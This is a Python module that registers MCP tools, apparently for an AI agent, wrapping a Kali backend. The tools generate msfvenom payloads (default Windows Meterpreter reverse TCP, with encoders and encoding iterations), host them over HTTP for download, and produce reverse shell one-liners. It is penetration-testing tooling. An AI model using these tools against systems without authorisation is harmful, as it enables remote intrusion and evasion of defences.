"""Payload generation tools (msfvenom, one-liners)."""

from typing import Dict, Any
from mcp.server.fastmcp import FastMCP


def register(mcp: FastMCP, kali_client) -> None:
    """Register payload generator tools."""

    @mcp.tool()
    def payload_templates() -> Dict[str, Any]:
        """
        List available payload templates and encoders for msfvenom.

        Returns:
            List of template names and available encoders
        """
        return kali_client.safe_get("api/payload/templates")

    @mcp.tool()
    def payload_generate(
        lhost: str, lport: int = 4444, template: str = "",
        payload: str = "windows/meterpreter/reverse_tcp",
        format_type: str = "exe", encoder: str = "", iterations: int = 1,
    ) -> Dict[str, Any]:
        """
        Generate a payload using msfvenom.

        Args:
            lhost: Your IP address for callback
            lport: Port for callback (default: 4444)
            template: Use a predefined template (e.g., 'windows_meterpreter_reverse_tcp')
            payload: Metasploit payload string (ignored if template specified)
            format_type: Output format - exe, elf, raw, ps1, etc.
            encoder: Encoder to use (e.g., 'x86/shikata_ga_nai')
            iterations: Number of encoding iterations

        Returns:
            Generated payload info including base64 content for small payloads
        """
        data = {
            "lhost": lhost, "lport": lport, "template": template,
            "payload": payload, "format": format_type,
            "encoder": encoder, "iterations": iterations,
        }
        return kali_client.safe_post("api/payload/generate", data)

    @mcp.tool()
    def payload_list() -> Dict[str, Any]:
        """List all generated payloads."""
        return kali_client.safe_get("api/payload/list")

    @mcp.tool()
    def payload_host_start(port: int = 8888) -> Dict[str, Any]:
        """
        Start HTTP server to host generated payloads for download.

        Args:
            port: Port for the hosting server (default: 8888)

        Returns:
            Server URL for downloading payloads
        """
        return kali_client.safe_post("api/payload/host/start", {"port": port})

    @mcp.tool()
    def payload_host_stop() -> Dict[str, Any]:
        """Stop the payload hosting server."""
        return kali_client.safe_post("api/payload/host/stop", {})

    @mcp.tool()
    def payload_one_liner(lhost: str, lport: int = 4444, shell_type: str = "all") -> Dict[str, Any]:
        """
        Generate reverse shell one-liner commands.

        Args:
            lhost: Your IP address for callback
            lport: Port for callback (default: 4444)
            shell_type: Type of shell - bash, python, nc, php, powershell, perl, ruby, or 'all'

        Returns:
            One-liner command(s) ready to copy-paste
        """
        data = {"lhost": lhost, "lport": lport, "shell_type": shell_type}
        return kali_client.safe_post("api/payload/one-liner", data)
